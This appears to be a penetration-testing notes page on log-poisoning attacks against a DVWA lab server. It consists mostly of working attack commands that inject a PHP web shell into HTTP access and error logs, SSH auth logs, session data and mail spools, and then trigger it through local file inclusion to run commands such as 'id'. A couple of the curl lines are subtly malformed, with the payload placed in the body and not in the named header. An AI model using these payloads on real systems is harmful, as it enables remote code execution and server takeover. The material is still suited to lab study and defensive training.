# Manual

TODO: include conditions and screenshots for the attack vectors

## HTTP

### Access Log

Make a valid request with the code in the `User-Agent` header.

```
$ curl -H 'User-Agent' --data "<?php system($_GET['cmd']); ?>" "http://dvwa.local" -v
```

### Error Log

Make an invalid request, an invalid inclusion for example, with the suitable `Referer` header.

```
$ curl -H 'Referer' --data "<?php system($_GET['cmd']); ?>" "http://dvwa.local/urldoesnotexist" -v
```

#### PHP Sessions

TODO: Go to authentication page to include PHP code to poison error log then perform a file inclusion.

```
username=<?=phpinfo();?>&password=test
```

## SSH

SSH logs the username of each connection. Create a connection to SSH with the suitable username.

```
$ ssh '<?php system($_GET['c']); ?>'@dvwa.local
```

```
/var/log/auth.log&cmd=ifconfig
```

## SMTP

```
$ mail -s "<?php system($_GET['cmd']);?>" www-data@dvwa.local < /dev/null
```

Enumerate valid [[07 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Cross Platform/Mail Server/SMTP|SMTP]] user accounts then poison the log with a webshell.

```
$ telnet dvwa.local 25

MAIL FROM:<test@email.com>
RCPT TO:<?php system($_GET['cmd']); ?>

Subject: This is a test
<?php system($_GET['cmd']);?>

.
```

Exploit it.

```
$ curl http://dvwa.local/index.php?page=/var/mail/www-data&cmd=id
```

---
## References

### Backlinks

- [[Log Poisoning]]